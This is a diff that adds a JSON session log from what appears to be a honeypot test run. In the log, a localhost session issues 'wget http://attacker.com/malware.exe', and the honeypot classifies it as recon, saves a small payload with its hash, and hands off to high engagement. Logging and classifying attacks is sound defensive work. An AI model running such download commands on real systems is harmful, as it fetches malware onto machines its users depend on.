@@ -1,0 +1,42 @@
+{
+  "session_id": "S-1770537909",
+  "src_ip": "127.0.0.1",
+  "src_port": 51135,
+  "start_ts": 1770537909.6540287,
+  "instance": "default",
+  "events": [
+    {
+      "ts": 1770537909.6580243,
+      "text": "wget http://attacker.com/malware.exe"
+    },
+    {
+      "ts": 1770537909.6580243,
+      "text": "[STRUCT_EVENT]={\"type\": \"classification\", \"label\": \"recon\", \"confidence\": 0.6, \"vector\": \"download\", \"src_ip\": \"127.0.0.1\", \"src_port\": 51135, \"engagement\": \"HIGH\", \"summary\": \"RECON (download) \\u2014 conf 0.60, ENG=HIGH\", \"ts\": 1770537909.6580243}"
+    },
+    {
+      "ts": 1770537909.6590238,
+      "text": "[CLASS]=recon|0.6|ENG=HIGH"
+    },
+    {
+      "ts": 1770537909.6600246,
+      "text": "[STRUCT_EVENT]={\"type\": \"payload_saved\", \"file\": \"payload_handoff_1770537909.bin\", \"path\": \"E:\\\\honeypot\\\\data\\\\sessions\\\\S-1770537909\\\\payload_handoff_1770537909.bin\", \"sha256\": \"f51014ed65966af24e2b27268c831b7832071690f286677855aac2f6973f82e1\", \"size\": 31, \"saved_ts\": 1770537909.6600246, \"src_ip\": \"127.0.0.1\", \"src_port\": 51135, \"summary\": \"Payload saved from suspected download\", \"ts\": 1770537909.6600246}"
+    },
+    {
+      "ts": 1770537909.6600246,
+      "text": "[PAYLOAD_SAVED]={'file': 'payload_handoff_1770537909.bin', 'path': 'E:\\\\honeypot\\\\data\\\\sessions\\\\S-1770537909\\\\payload_handoff_1770537909.bin', 'sha256': 'f51014ed65966af24e2b27268c831b7832071690f286677855aac2f6973f82e1', 'size': 31, 'saved_ts': 1770537909.6600246}"
+    },
+    {
+      "ts": 1770537909.6610286,
+      "text": "[ACTION]=HANDOFF_TO_HIGH_ENGAGEMENT"
+    },
+    {
+      "ts": 1770537909.6630235,
+      "text": "[HIGH_ENGAGEMENT]=START"
+    },
+    {
+      "ts": 1770537910.1597211,
+      "text": "[HIGH_ENGAGEMENT]=END"
+    }
+  ],
+  "end_time": "Sun Feb  8 13:35:10 2026"
+}
